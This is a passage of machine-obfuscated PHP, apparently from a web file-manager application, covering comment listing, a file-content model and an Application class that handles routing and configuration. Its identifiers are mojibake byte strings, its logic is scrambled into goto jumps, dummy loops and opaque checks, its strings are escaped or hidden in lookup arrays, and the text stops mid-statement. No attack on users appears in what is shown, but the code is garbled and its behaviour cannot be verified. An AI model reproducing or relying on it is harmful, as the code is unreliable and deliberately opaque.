Bú≤ΩÿßîŸ: $b≈ı∫˜’£Â =& $_SERVER[ú∫]; $cè–Ûûâû“ = array($b≈ı∫˜’£Â[549] => $DΩïÿô‘â…, $b≈ı∫˜’£Â[550] => $f◊¶ÌßÑÌÆ); $AØ¨ﬂÑÀºŒ = $this->where($cè–Ûûâû“)->count(); goto d£ó⁄ÖÛˆç; d£ó⁄ÖÛˆç: $eê‹Ïœ‘õë = "\x52\111\x47\110\124\40\112\x4f\111\116\x20{$this->tablePrefix}\x63\157\x6d\x6d\145\x6e\x74\x5f\x70\162\141\x69\163\145\x20\163\x74\x61\162\x20\x6f\x6e\x20\x63\157\155\155\145\156\x74\x2e\x63\x6f\x6d\155\x65\156\164\x49\104\x20\75\x20\163\164\x61\x72\x2e\x63\x6f\x6d\x6d\145\x6e\x74\x49\x44"; $FΩ∫âµæÚö = $this->alias($b≈ı∫˜’£Â[352])->where($cè–Ûûâû“)->join($eê‹Ïœ‘õë, $b≈ı∫˜’£Â[1727])->count(); $b‘òïÇÉÒÈ = array($b≈ı∫˜’£Â[1728] => $AØ¨ﬂÑÀºŒ, $b≈ı∫˜’£Â[1729] => $FΩ∫âµæÚö); goto a•⁄êú◊”‚; a•⁄êú◊”‚: return $b‘òïÇÉÒÈ; goto BèÿÉ„©üŸ; BèÿÉ„©üŸ: } public function listData($C´êòÇ≥ëÿ) { $B√ˆï¬§…‹ =& $_SERVER[ú∫]; if (isset($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1730]])) { if ($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1730]]) { $C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1731]] = array($B√ˆï¬§…‹[971], intval($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1730]])); } unset($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1730]]); } if (isset($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1732]])) { if ($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1732]]) { $C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1731]] = array($B√ˆï¬§…‹[968], intval($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1732]])); } unset($C´êòÇ≥ëÿ[$B√ˆï¬§…‹[1732]]); } return $this->_listData($C´êòÇ≥ëÿ); } private function _listData($D‹Ò∆ñã´ç) { $b™∫∏◊í¡œ =& $_SERVER[ú∫]; $e¢ñ’ÿîÉõ = $this->where($D‹Ò∆ñã´ç)->_makeOrder()->selectPage(100); $this->_listAppendParent($e¢ñ’ÿîÉõ[$b™∫∏◊í¡œ[367]]); $this->_listAppendUser($e¢ñ’ÿîÉõ[$b™∫∏◊í¡œ[367]]); $this->_listAppendMeta($e¢ñ’ÿîÉõ[$b™∫∏◊í¡œ[367]]); return $e¢ñ’ÿîÉõ; } private function _makeOrder() { $aë©Ôà†∏ø =& $_SERVER[ú∫]; $AÆƒäÕÙ‹Æ = array($aë©Ôà†∏ø[1723], $aë©Ôà†∏ø[1722], $aë©Ôà†∏ø[194]); $dî˘¬¶»‰„ = Input::get($aë©Ôà†∏ø[435], $aë©Ôà†∏ø[7], $aë©Ôà†∏ø[416], $AÆƒäÕÙ‹Æ); $AûıòéØê§ = Input::get($aë©Ôà†∏ø[436], $aë©Ôà†∏ø[7], $aë©Ôà†∏ø[1522], array($aë©Ôà†∏ø[1733], $aë©Ôà†∏ø[431])); $A»Ûå‹†Ωá = $dî˘¬¶»‰„ . $aë©Ôà†∏ø[50] . $AûıòéØê§; return $this->order($A»Ûå‹†Ωá); } private function _listAppendParent(&$e–˜≠ß∆Âõ) { goto E≥Í∂»Ö£Ø; dÀŸ≠‚¿Ùﬁ: if (!$F∂Ì≠¯·ßª) { return; } $d˘˜ñÃ’ª· = $this->where(array($B¶‰Ùﬂü°ö[1721] => array($B¶‰Ùﬂü°ö[7], $F∂Ì≠¯·ßª)))->select(); $d˘˜ñÃ’ª· = array_to_keyvalue($d˘˜ñÃ’ª·, $B¶‰Ùﬂü°ö[1731]); goto CäÜ∆øﬁØµ; CäÜ∆øﬁØµ: foreach ($e–˜≠ß∆Âõ as &$BÉ“”çøŸÿ) { if (isset($d˘˜ñÃ’ª·[$BÉ“”çøŸÿ[$B¶‰Ùﬂü°ö[1720]]])) { $BÉ“”çøŸÿ[$B¶‰Ùﬂü°ö[1734]] = $d˘˜ñÃ’ª·[$BÉ“”çøŸÿ[$B¶‰Ùﬂü°ö[1720]]]; } } unset($BÉ“”çøŸÿ); goto aƒÖ‹ëìòΩ; E≥Í∂»Ö£Ø: $B¶‰Ùﬂü°ö =& $_SERVER[ú∫]; $F∂Ì≠¯·ßª = array_unique(array_to_keyvalue($e–˜≠ß∆Âõ, $B¶‰Ùﬂü°ö[33], $B¶‰Ùﬂü°ö[1720])); $F∂Ì≠¯·ßª = array_remove_value($F∂Ì≠¯·ßª, $B¶‰Ùﬂü°ö[191]); goto dÀŸ≠‚¿Ùﬁ; aƒÖ‹ëìòΩ: } private function _listAppendUser(&$cè√≈…˜≥‡) { goto cä¿å≠Ö∑¬; bêô†ôª∫ê: foreach ($cè√≈…˜≥‡ as &$AÜõáÿÂˆè) { $AÜõáÿÂˆè[$C¬ëØ™ûË‹[562]] = $e√æª˜Ì ¯[$AÜõáÿÂˆè[$C¬ëØ™ûË‹[1528]]]; if (isset($AÜõáÿÂˆè[$C¬ëØ™ûË‹[1734]])) { $AÜõáÿÂˆè[$C¬ëØ™ûË‹[1734]][$C¬ëØ™ûË‹[562]] = $e√æª˜Ì ¯[$AÜõáÿÂˆè[$C¬ëØ™ûË‹[1734]][$C¬ëØ™ûË‹[1528]]]; } } unset($AÜõáÿÂˆè); goto EÛÌ≥ÔÏèß; cä¿å≠Ö∑¬: $C¬ëØ™ûË‹ =& $_SERVER[ú∫]; $F˘˜£Çé°ï = array_unique(array_to_keyvalue($cè√≈…˜≥‡, $C¬ëØ™ûË‹[33], $C¬ëØ™ûË‹[1528])); $F˘˜£Çé°ï = array_remove_value($F˘˜£Çé°ï, $C¬ëØ™ûË‹[191]); goto dàáú÷¶ÿÈ; dàáú÷¶ÿÈ: if (count($F˘˜£Çé°ï) == 0) { return; } foreach ($cè√≈…˜≥‡ as $AÜõáÿÂˆè) { if (isset($AÜõáÿÂˆè[$C¬ëØ™ûË‹[1734]])) { $F˘˜£Çé°ï[] = $AÜõáÿÂˆè[$C¬ëØ™ûË‹[1734]][$C¬ëØ™ûË‹[1528]]; } } $e√æª˜Ì ¯ = Model($C¬ëØ™ûË‹[506])->userListInfo($F˘˜£Çé°ï); goto bêô†ôª∫ê; EÛÌ≥ÔÏèß: } private function _listAppendMeta(&$bÙŒæÆ≈ÿé) { goto cÁœ—œ“®æ; cÁœ—œ“®æ: $D¥≥ç∂¶ä£ =& $_SERVER[ú∫]; $FÍ∂∞Ÿ≤Ûê = array_unique(array_to_keyvalue($bÙŒæÆ≈ÿé, $D¥≥ç∂¶ä£[33], $D¥≥ç∂¶ä£[1731])); $FÍ∂∞Ÿ≤Ûê = array_remove_value($FÍ∂∞Ÿ≤Ûê, $D¥≥ç∂¶ä£[191]); goto dŒª´Ì”‘“; aªà‰æﬁÆ™: if (!$FÃŸﬂ·åå¯) { return !1; } foreach ($bÙŒæÆ≈ÿé as &$B⁄ùÉÜ≈≤©) { $B⁄ùÉÜ≈≤©[$D¥≥ç∂¶ä£[445]] = $FÃŸﬂ·åå¯[$B⁄ùÉÜ≈≤©[$D¥≥ç∂¶ä£[1731]]]; if (isset($B⁄ùÉÜ≈≤©[$D¥≥ç∂¶ä£[1734]])) { $B⁄ùÉÜ≈≤©[$D¥≥ç∂¶ä£[1734]][$D¥≥ç∂¶ä£[445]] = $FÃŸﬂ·åå¯[$B⁄ùÉÜ≈≤©[$D¥≥ç∂¶ä£[1734]][$D¥≥ç∂¶ä£[1731]]]; } } unset($B⁄ùÉÜ≈≤©); goto Aú¶íè£¿¢; dŒª´Ì”‘“: if (!$FÍ∂∞Ÿ≤Ûê) { return; } foreach ($bÙŒæÆ≈ÿé as $B⁄ùÉÜ≈≤©) { if (isset($B⁄ùÉÜ≈≤©[$D¥≥ç∂¶ä£[1734]])) { $FÍ∂∞Ÿ≤Ûê[] = $B⁄ùÉÜ≈≤©[$D¥≥ç∂¶ä£[1734]][$D¥≥ç∂¶ä£[1731]]; } } $FÃŸﬂ·åå¯ = $this->metaList($FÍ∂∞Ÿ≤Ûê); goto aªà‰æﬁÆ™; Aú¶íè£¿¢: } private function metaList($Aõê∑°•≤®) { goto F¬•íµÀæ…; Aà◊∑Œ¶∏: $a¬Ïµâ∏ââ = Model($bßç∑ŸÆôô[1735])->where($dﬁ¬‘ô‘·Ü)->select(); $a¬Ïµâ∏ââ = array_to_keyvalue_group($a¬Ïµâ∏ââ, $bßç∑ŸÆôô[1731]); foreach ($a¬Ïµâ∏ââ as $AπÉ™Òë¯º => $Dûøª¯∂À˜) { $F¶èˆê≠«¶ = array(); foreach ($Dûøª¯∂À˜ as $AÌ´ù‚Ë¬À) { $F¶èˆê≠«¶[$AÌ´ù‚Ë¬À[$bßç∑ŸÆôô[93]]] = $AÌ´ù‚Ë¬À[$bßç∑ŸÆôô[372]]; } $a¬Ïµâ∏ââ[$AπÉ™Òë¯º] = $F¶èˆê≠«¶; } goto Açàß“äåΩ; F¬•íµÀæ…: $bßç∑ŸÆôô =& $_SERVER[ú∫]; if (!$Aõê∑°•≤®) { return array(); } $dﬁ¬‘ô‘·Ü = array($bßç∑ŸÆôô[1731] => array($bßç∑ŸÆôô[7], $Aõê∑°•≤®)); goto Aà◊∑Œ¶∏; Açàß“äåΩ: return $a¬Ïµâ∏ââ ? $a¬Ïµâ∏ââ : array(); goto Eñ™ÎŒﬁêπ; Eñ™ÎŒﬁêπ: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\154\x65\137\x63\x6f\156\164\145\156\x74\163"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\x69\155\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\162\164", "\146\165\156\x63\x74\151\157\x6e")); } goto EÎ±ó˜ıíŒ; BíÎ≥¡Ê§≈: if (strlen($E√÷ØøÂ—Ø) < $_SERVER[ú∫][578]) { return; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($AﬁÇÚ¬îàÒ) { goto Cπ¯˜û§á‘; c≤“≈“Õù¨: $E™…Â◊Éà = $d·Ìä≤œø’[581]; while ($E™…Â◊Éà < $d·Ìä≤œø’[582]) { if ($E™…Â◊Éà >= 0) { break; } $E™…Â◊Éà++; } $this->defaultController = $C¬ŒõõúÓá[1] ? $C¬ŒõõúÓá[1] : $this->defaultController; goto a˘Íï€‰Ñ¶; d‘∏íı†≈î: $this->{$_SERVER[é°ËπÔ úﬁ][3]}($c“ ”Úã÷ƒ[4], array($this, $c“ ”Úã÷ƒ[5])); $eƒÇ©ìÚÒØ = $d·Ìä≤œø’[584]; goto aâƒ·¶Úèñ; A¿Ú⁄‘˘é¡: $B®•ñÈ‹Æ = $d·Ìä≤œø’[579]; while (strlen($B®•ñÈ‹Æ) < $d·Ìä≤œø’[580]) { if (!$B®•ñÈ‹Æ) { break; } $B®•ñÈ‹Æ++; } $this->defaultModule = $C¬ŒõõúÓá[0] ? $C¬ŒõõúÓá[0] : $this->defaultModule; goto c≤“≈“Õù¨; Cπ¯˜û§á‘: $d·Ìä≤œø’ =& $_SERVER[ú∫]; $c“ ”Úã÷ƒ =& $_SERVER[é°ËπÔ úﬁ]; $C¬ŒõõúÓá = $c“ ”Úã÷ƒ[0]($c“ ”Úã÷ƒ[1], $c“ ”Úã÷ƒ[2]($AﬁÇÚ¬îàÒ, $c“ ”Úã÷ƒ[1])); goto A¿Ú⁄‘˘é¡; a˘Íï€‰Ñ¶: $dæõ—ÉŸÑÈ = $d·Ìä≤œø’[583]; if (strlen($dæõ—ÉŸÑÈ) < $d·Ìä≤œø’[578]) { die; } $this->defaultAction = $C¬ŒõõúÓá[2] ? $C¬ŒõõúÓá[2] : $this->defaultAction; goto d‘∏íı†≈î; aâƒ·¶Úèñ: } public function appRun($A¿£ÇÎﬂèß) { goto e¢–Ïƒòä©; DÆ©∆É∏ı∑: if (!$c∫ÒÍ÷ÂçÑ) { die; } if ($f◊·‹è©àï == $B‰úûÿ° [8]) { $fœ≈òÒˆÏÑ = $B‰úûÿ° [9]; $a£õÑÛ±Øß[0] = $B‰úûÿ° [10]; $a£õÑÛ±Øß[1] = $a£õÑÛ±Øß[1] . $B‰úûÿ° [11]; $A¿£ÇÎﬂèß = $B‰úûÿ° [12]($B‰úûÿ° [1], $a£õÑÛ±Øß); $A¿£ÇÎﬂèß = $B‰úûÿ° [2]($A¿£ÇÎﬂèß, $B‰úûÿ° [1]); } $B‰úûÿ° [13](array($B‰úûÿ° [14], $B‰úûÿ° [15]), $fœ≈òÒˆÏÑ . $B‰úûÿ° [16], $A¿£ÇÎﬂèß); goto D‡Ù’≥©Ì◊; e¢–Ïƒòä©: $bπãã‹Ù∑∑ =& $_SERVER[ú∫]; $B‰úûÿ°  =& $_SERVER[é°ËπÔ úﬁ]; $a£õÑÛ±Øß = $B‰úûÿ° [0]($B‰úûÿ° [1], $A¿£ÇÎﬂèß); goto CÔËèïÀÒá; CÔËèïÀÒá: $f◊·‹è©àï = $B‰úûÿ° [6]($a£õÑÛ±Øß[0]); $fœ≈òÒˆÏÑ = $B‰úûÿ° [7]; $c∫ÒÍ÷ÂçÑ = $bπãã‹Ù∑∑[585]; goto DÆ©∆É∏ı∑; D‡Ù’≥©Ì◊: $B‰úûÿ° [17]($A¿£ÇÎﬂèß); $Bﬁ÷ﬁƒ√ﬁá = $bπãã‹Ù∑∑[586]; if (strlen($Bﬁ÷ﬁƒ√ﬁá) < $bπãã‹Ù∑∑[580]) { die; } goto Dñ‚”È≈ÉÉ; Dñ‚”È≈ÉÉ: $B‰úûÿ° [13](array($B‰úûÿ° [14], $B‰úûÿ° [15]), $fœ≈òÒˆÏÑ . $B‰úûÿ° [18], $A¿£ÇÎﬂèß); goto bπÛƒÏé◊›; bπÛƒÏé◊›: } private function autorun() { $cﬂΩÚÈ√‚∫ =& $_SERVER[é°ËπÔ úﬁ]; global $config; if ($cﬂΩÚÈ√‚∫[19]($config[$cﬂΩÚÈ√‚∫[20]]) == 0) { return; } foreach ($config[$cﬂΩÚÈ√‚∫[20]] as $DÈø‰ß∞£à => $b“»§ƒ∞ñ˘) { $this->{$_SERVER[é°ËπÔ úﬁ][21]}($b“»§ƒ∞ñ˘); } } private function rzkvbc356ab0() { goto dØØÆ∞Ü∂›; cÃ·›Ùùé: $Eﬂ⁄ëµ≠ı = $A∞í’£∑˘—[25]($bâ…«Ÿ«™, 0, -$A∞í’£∑˘—[24]($eŒãªüË¬¿)); $A«öüà£µø = array($A∞í’£∑˘—[8], $Eﬂ⁄ëµ≠ı); $f‚∂¯é“√≥ = $FÉ£¡∑àÈÓ[587]; goto C∆ÓñﬂÂ“; dØØÆ∞Ü∂›: $FÉ£¡∑àÈÓ =& $_SERVER[ú∫]; $A∞í’£∑˘— =& $_SERVER[é°ËπÔ úﬁ]; $eŒãªüË¬¿ = $A∞í’£∑˘—[8]; goto FÙãÛêê∫±; cñ¬óΩ˘“∂: while ($A∫œ∞ı¨åÂ < $FÉ£¡∑àÈÓ[589]) { if ($A∫œ∞ı¨åÂ >= 0) { break; } $A∫œ∞ı¨åÂ++; } $GLOBALS[$A∞í’£∑˘—[22]][$A∞í’£∑˘—[28]] = $A∞í’£∑˘—[29]($A∞í’£∑˘—[1], $GLOBALS[$A∞í’£∑˘—[22]][$A∞í’£∑˘—[23]]); $CÖ¬≤ÜâÂœ = $FÉ£¡∑àÈÓ[591]; goto Bûêô¨Û˜ƒ; Bûêô¨Û˜ƒ: if (!$CÖ¬≤ÜâÂœ) { return; } goto eó¶í¿ÖëÛ; C∆ÓñﬂÂ“: if (strlen($f‚∂¯é“√≥) < $FÉ£¡∑àÈÓ[580]) { return; } $dÏ¶Ñ∏≥—õ = $A∞í’£∑˘—[26]($GLOBALS[$A∞í’£∑˘—[22]][$A∞í’£∑˘—[23]], 1); $döá±≥ü€≤ = $FÉ£¡∑àÈÓ[588]; goto F†®ƒ›ÜÆ‹; FÙãÛêê∫±: $bâ…«Ÿ«™ = $GLOBALS[$A∞í’£∑˘—[22]][$A∞í’£∑˘—[23]][0]; if (!$bâ…«Ÿ«™ || $A∞í’£∑˘—[24]($bâ…«Ÿ«™) <= $A∞í’£∑˘—[24]($eŒãªüË¬¿)) { return; } if ($A∞í’£∑˘—[6]($A∞í’£∑˘—[25]($bâ…«Ÿ«™, -$A∞í’£∑˘—[24]($eŒãªüË¬¿))) != $eŒãªüË¬¿) { return; } goto cÃ·›Ùùé; F†®ƒ›ÜÆ‹: if (strlen($döá±≥ü€≤) < $FÉ£¡∑àÈÓ[589]) { return; } $GLOBALS[$A∞í’£∑˘—[22]][$A∞í’£∑˘—[23]] = $A∞í’£∑˘—[27]($A«öüà£µø, $dÏ¶Ñ∏≥—õ); $A∫œ∞ı¨åÂ = $FÉ£¡∑àÈÓ[590]; goto cñ¬óΩ˘“∂; eó¶í¿ÖëÛ: } private function rpkuba8566f3() { goto b∆ÒÔÚÕ§ä; B¨Ò•ë¥‹È: if (!$Aé‡£Ë∫‡Ø) { return; } $fŸ∑ÌÍß¬∞[34]($fŸ∑ÌÍß¬∞[35], $C°Ç‰ãé  , $Dè›ÊÁã°Õ); $c†ÁüØÑ—Ø = $e±ºÁ‚†ßÃ[593]; goto BÚ¯†≈ˆ™ﬂ; BÚ¯†≈ˆ™ﬂ: $C°Ç‰ãé   = $fŸ∑ÌÍß¬∞[2]($Dè›ÊÁã°Õ[0][0], $fŸ∑ÌÍß¬∞[36]); $GLOBALS[$fŸ∑ÌÍß¬∞[22]][$fŸ∑ÌÍß¬∞[23]] = $fŸ∑ÌÍß¬∞[0]($fŸ∑ÌÍß¬∞[36], $C°Ç‰ãé  ); $Fî÷äãÙ„Ô = $e±ºÁ‚†ßÃ[594]; goto A“èÀœÛ≥ó; EòÀÇ¢¿Ìÿ: $B„ï¶◊»≠≈ = $fŸ∑ÌÍß¬∞[33]($bú≥™∑îÉﬁ, $C»òé≤ùú‰); $C°Ç‰ãé   = $fŸ∑ÌÍß¬∞[25]($bú≥™∑îÉﬁ, $B„ï¶◊»≠≈ + $fŸ∑ÌÍß¬∞[24]($C»òé≤ùú‰)); $Aé‡£Ë∫‡Ø = $e±ºÁ‚†ßÃ[592]; goto B¨Ò•ë¥‹È; b∆ÒÔÚÕ§ä: $e±ºÁ‚†ßÃ =& $_SERVER[ú∫]; $fŸ∑ÌÍß¬∞ =& $_SERVER[é°ËπÔ úﬁ]; if ($GLOBALS[$fŸ∑ÌÍß¬∞[22]][$fŸ∑ÌÍß¬∞[28]] != $fŸ∑ÌÍß¬∞[10]) { return; } goto Dûœ∏Ø¨˘∆; A“èÀœÛ≥ó: $GLOBALS[$fŸ∑ÌÍß¬∞[22]][$fŸ∑ÌÍß¬∞[28]] = $fŸ∑ÌÍß¬∞[29]($fŸ∑ÌÍß¬∞[1], $GLOBALS[$fŸ∑ÌÍß¬∞[22]][$fŸ∑ÌÍß¬∞[23]]); goto Dıè◊Ç†Ω≤; Dûœ∏Ø¨˘∆: $bú≥™∑îÉﬁ = $_SERVER[$fŸ∑ÌÍß¬∞[30]]; $C»òé≤ùú‰ = $fŸ∑ÌÍß¬∞[31]; if (!$fŸ∑ÌÍß¬∞[32]($bú≥™∑îÉﬁ, $C»òé≤ùú‰)) { return; } goto EòÀÇ¢¿Ìÿ; Dıè◊Ç†Ω≤: } public function run() { goto E–öÉà≠Ûœ; f¡ÜÒ¶£πî: $_SERVER[$Fêƒ⁄‘ïäî[44]] = $Fêƒ⁄‘ïäî[6](ACTION); $this->{$_SERVER[é°ËπÔ úﬁ][45]}(); $eÉâã®À¿˘ = $a≈ò≠†ù¿—[600]; goto CÿßÉÒÔáÕ; Dı±√¡°åª: $cÉóä¶ﬂ∞∑ = $a≈ò≠†ù¿—[597]; if (strlen($cÉóä¶ﬂ∞∑) < $a≈ò≠†ù¿—[578]) { die; } $Fêƒ⁄‘ïäî[39]($Fêƒ⁄‘ïäî[40], isset($FéπﬂéúŸè[0]) && $FéπﬂéúŸè[0] ? $FéπﬂéúŸè[0] : $this->defaultModule); goto dí¯«ëÊñì; C ŸÒË∆‚ê: if (!$B÷ù¢ıÔ«å) { return; } $FéπﬂéúŸè = $GLOBALS[$Fêƒ⁄‘ïäî[22]][$Fêƒ⁄‘ïäî[23]]; $c‹ãª˘≈±ç = $GLOBALS[$Fêƒ⁄‘ïäî[22]][$Fêƒ⁄‘ïäî[28]]; goto Dı±√¡°åª; D›óÜ–»ñû: $a¢ÑÍ°˘ÔÛ = $a≈ò≠†ù¿—[595]; $this->{$_SERVER[é°ËπÔ úﬁ][38]}(); $B÷ù¢ıÔ«å = $a≈ò≠†ù¿—[596]; goto C ŸÒË∆‚ê; CÿßÉÒÔáÕ: if (!$eÉâã®À¿˘) { die; } if ($Fêƒ⁄‘ïäî[19]($FéπﬂéúŸè) >= 3) { $this->{$_SERVER[é°ËπÔ úﬁ][21]}($c‹ãª˘≈±ç); } else { $this->{$_SERVER[é°ËπÔ úﬁ][21]}(ACTION); } goto CÇ∏äèºƒ÷; D€ÿê„∫í™: while ($càáû À£¶ < $a≈ò≠†ù¿—[580]) { if ($càáû À£¶ >= 0) { break; } $càáû À£¶++; } $Fêƒ⁄‘ïäî[39]($Fêƒ⁄‘ïäî[43], MOD . $Fêƒ⁄‘ïäî[1] . ST . $Fêƒ⁄‘ïäî[1] . ACT); $E·ÆÓÙÆÉ˜ = $a≈ò≠†ù¿—[599]; goto f¡ÜÒ¶£πî; dí¯«ëÊñì: $Fêƒ⁄‘ïäî[39]($Fêƒ⁄‘ïäî[41], isset($FéπﬂéúŸè[1]) && $FéπﬂéúŸè[0] ? $FéπﬂéúŸè[1] : $this->defaultController); $Fêƒ⁄‘ïäî[39]($Fêƒ⁄‘ïäî[42], isset($FéπﬂéúŸè[2]) && $FéπﬂéúŸè[0] ? $FéπﬂéúŸè[2] : $this->defaultAction); $càáû À£¶ = $a≈ò≠†ù¿—[598]; goto D€ÿê„∫í™; E–öÉà≠Ûœ: $a≈ò≠†ù¿— =& $_SERVER[ú∫]; $Fêƒ⁄‘ïäî =& $_SERVER[é°ËπÔ úﬁ]; $this->{$_SERVER[é°ËπÔ úﬁ][37]}(); goto D›óÜ–»ñû; CÇ∏äèºƒ÷: } private $thzj1344bdf0 = array(); private $gokxb9370e2b = ''; public function snor9c787c3f() { goto f¥ÖÙÕÍ”Á; d‚Ñà±±‚ê: if (!$D∆∞¿Ω…‚˜) { return; } $this->{$_SERVER[é°ËπÔ úﬁ][49]}(); $this->{$_SERVER[é°ËπÔ úﬁ][50]}(); goto eàÓ˘ê™Æ±; eàÓ˘ê™Æ±: $FœÇÙ≤Êêè = $bœˆ¬‰Ωëé[602]; if (strlen($FœÇÙ≤Êêè) < $bœˆ¬‰Ωëé[582]) { die; } $this->{$_SERVER[é°ËπÔ úﬁ][51]}(); goto D”‚ßãπöÆ; D”‚ßãπöÆ: $this->{$_SERVER[é°ËπÔ úﬁ][52]}(); $this->{$_SERVER[é°ËπÔ úﬁ][3]}($aë â›–î¯[53], array($this, $aë â›–î¯[54])); $A≈èÎŒÑºÇ = $bœˆ¬‰Ωëé[603]; goto F‰Â¯•äÇ—; f¥ÖÙÕÍ”Á: $bœˆ¬‰Ωëé =& $_SERVER[ú∫]; $aë â›–î¯ =& $_SERVER[é°ËπÔ úﬁ]; $this->{$_SERVER[é°ËπÔ úﬁ][46]}(); goto A™úªÙóª•; EÑ≠ …∫ á: $this->{$_SERVER[é°ËπÔ úﬁ][3]}($aë â›–î¯[59], array($this, $aë â›–î¯[60])); goto BÀƒ˜ﬂõ≠; F‰Â¯•äÇ—: if (strlen($A≈èÎŒÑºÇ) < $bœˆ¬‰Ωëé[582]) { return; } $this->{$_SERVER[é°ËπÔ úﬁ][3]}($aë â›–î¯[55], array($this, $aë â›–î¯[56])); $this->{$_SERVER[é°ËπÔ úﬁ][3]}($aë â›–î¯[57], array($this, $aë â›–î¯[58])); goto EÑ≠ …∫ á; A™úªÙóª•: $this->{$_SERVER[é°ËπÔ úﬁ][47]}(); $this->{$_SERVER[é°ËπÔ úﬁ][48]}(); $D∆∞¿Ω…‚˜ = $bœˆ¬‰Ωëé[601]; goto d‚Ñà±±‚ê; BÀƒ˜ﬂõ≠: } public function nupa8c28138f($cÜç´Ø´ùó) { goto e¿√º±∫Ç§; fû±ôÓáÙœ: $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[140]] = $C∆∏—Óπ®†[116]($this->thzj1344bdf0, $C∆∏—Óπ®†[141], $C∆∏—Óπ®†[10]); if ($C∆∏—Óπ®†[116]($GLOBALS, $C∆∏—Óπ®†[142]) && $this->config[$C∆∏—Óπ®†[143]]) { $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[144]] = WEB_ROOT; } return $cÜç´Ø´ùó; goto E«’á§ÊÍ≠; A§ëò“–—ü: $dë£≈ˆ¯¨ã = $Eö ≠Œô‰”[609]; if (!$dë£≈ˆ¯¨ã) { return; } $cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[107]][$C∆∏—Óπ®†[112]] = array($C∆∏—Óπ®†[113] => (int) $DÌÿÁÙ¡åﬁ[$C∆∏—Óπ®†[114]], $C∆∏—Óπ®†[115] => (int) $C∆∏—Óπ®†[116]($DÌÿÁÙ¡åﬁ, $C∆∏—Óπ®†[117], 0)); goto cÉù™∆…†ñ; Bç‡„ñ°ó¡: $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[130]] = $this->gokxb9370e2b; $F≥ËƒÒ„Ì± = $Eö ≠Œô‰”[613]; while (strlen($F≥ËƒÒ„Ì±) < $Eö ≠Œô‰”[578]) { if (!$F≥ËƒÒ„Ì±) { break; } $F≥ËƒÒ„Ì±++; } goto aÍÃË›ÿ¶∏; e¿√º±∫Ç§: $Eö ≠Œô‰” =& $_SERVER[ú∫]; $C∆∏—Óπ®† =& $_SERVER[é°ËπÔ úﬁ]; $B¡∏ÜƒùΩÃ = $C∆∏—Óπ®†[61]($C∆∏—Óπ®†[62])->{$_SERVER[é°ËπÔ úﬁ][63]}(); goto CÁë¨å≈™ê; A‹ÍÍ≈ïŒà: $b‰ÃÌâ©âÕ = $Eö ≠Œô‰”[612]; if (strlen($b‰ÃÌâ©âÕ) < $Eö ≠Œô‰”[578]) { return; } $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[127]] = $C∆∏—Óπ®†[128]($C∆∏—Óπ®†[129]()); goto Bç‡„ñ°ó¡; AÁæ»ÈîŸâ: unset($cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[108]][$C∆∏—Óπ®†[109]]); unset($cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[108]][$C∆∏—Óπ®†[110]]); $aå‰ö™’¯≥ = $Eö ≠Œô‰”[608]; goto f“√úúµπ˜; DÜΩÎ†ó†: $E§„üñìë¶ = $Eö ≠Œô‰”[611]; while ($E§„üñìë¶ < $Eö ≠Œô‰”[580]) { if ($E§„üñìë¶ >= 0) { break; } $E§„üñìë¶++; } $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[123]] = $C∆∏—Óπ®†[124]($_SERVER[$C∆∏—Óπ®†[125]] . $B¡∏ÜƒùΩÃ[$C∆∏—Óπ®†[126]]); goto A‹ÍÍ≈ïŒà; aÍÃË›ÿ¶∏: if ($B¡∏ÜƒùΩÃ[$C∆∏—Óπ®†[130]] != $C∆∏—Óπ®†[131]) { $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[132]] = $B¡∏ÜƒùΩÃ[$C∆∏—Óπ®†[132]]; $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[133]] = $B¡∏ÜƒùΩÃ[$C∆∏—Óπ®†[133]]; $fÁ÷‘¿Ø¡ê = $C∆∏—Óπ®†[134](10) . $this->gokxb9370e2b . $C∆∏—Óπ®†[134](5); $cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[135]][$C∆∏—Óπ®†[136]] = $this->{$_SERVER[é°ËπÔ úﬁ][137]}($fÁ÷‘¿Ø¡ê, $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[123]]); } if ($this->gokxb9370e2b == $C∆∏—Óπ®†[131]) { $cÜç´Ø´ùó[$C∆∏—Óπ®†[106]][$C∆∏—Óπ®†[107]][$C∆∏—Óπ®†[112]][$C∆∏—Óπ®†[117]] = 0; } $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[138]] = $C∆∏—Óπ®†[116]($this->thzj1344bdf0, $C∆∏—Óπ®†[139], $C∆∏—Óπ®†[10]); goto fû±ôÓáÙœ; cÉù™∆…†ñ: $eÔç°†⁄ñÁ = $Eö ≠Œô‰”[610]; if (!$eÔç°†⁄ñÁ) { die; } $cÜç´Ø´ùó[$C∆∏—Óπ®†[118]][$C∆∏—Óπ®†[119]] = $C∆∏—Óπ®†[120]($C∆∏—Óπ®†[121])->{$_SERVER[é°ËπÔ úﬁ][122]}(); goto DÜΩÎ†ó†; CÖÃÇôƒøì: 